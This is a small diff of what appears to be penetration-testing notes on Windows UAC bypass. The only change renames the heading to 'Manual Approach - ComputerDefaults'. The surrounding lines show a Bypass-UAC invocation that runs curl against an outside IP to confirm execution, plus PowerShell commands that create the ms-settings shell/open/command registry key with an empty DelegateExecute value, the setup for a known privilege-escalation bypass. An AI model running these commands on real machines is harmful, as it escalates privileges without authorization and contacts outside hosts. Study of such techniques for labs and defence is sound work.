@@ -2,7 +2,7 @@
 
 - Invoke and run: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`
 
-### Manual Approach
+### Manual Approach - ComputerDefaults
 
     New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
     New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
